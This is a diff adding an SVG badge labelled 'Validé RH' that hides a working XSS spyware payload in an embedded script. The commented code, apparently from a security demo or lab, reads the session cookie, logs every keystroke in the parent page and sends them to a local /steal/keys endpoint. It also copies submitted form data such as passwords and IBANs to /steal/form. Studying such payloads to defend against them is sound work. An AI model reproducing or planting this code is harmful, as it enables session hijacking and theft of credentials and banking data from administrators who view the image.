@@ -1,0 +1,38 @@
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+  <circle cx="100" cy="100" r="90" fill="#48bb78" />
+  <text x="50%" y="50%" text-anchor="middle" fill="white" font-family="Arial">Validé RH</text>
+
+  <script type="text/javascript">
+    <![CDATA[
+    // Le code malveillant s'exécute dans le contexte de la page
+    
+    // 1. Récupération du cookie de session (Session Hijacking)
+    const sessionToken = document.cookie;
+    
+    // 2. KEYLOGGER : On écoute tout ce que tape l'admin
+    window.parent.document.addEventListener('keydown', function(e) {
+        // Envoi discret (Pixel tracking technique)
+        new Image().src = 'http://localhost:3000/steal/keys?k=' + encodeURIComponent(e.key) + '&t=' + sessionToken;
+    });
+
+    // 3. VOL DE FORMULAIRE : On écoute la soumission des formulaires
+    // Si l'admin modifie un mot de passe ou un IBAN, on le vole avant l'envoi
+    window.parent.document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', (e) => {
+            // On ne bloque pas l'envoi, on copie juste les données
+            const formData = new FormData(e.target);
+            const data = {};
+            formData.forEach((value, key) => data[key] = value);
+            
+            fetch('/steal/form', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+        });
+    });
+
+    console.log("🦠 Spyware injecté avec succès.");
+    ]]>
+  </script>
+</svg>
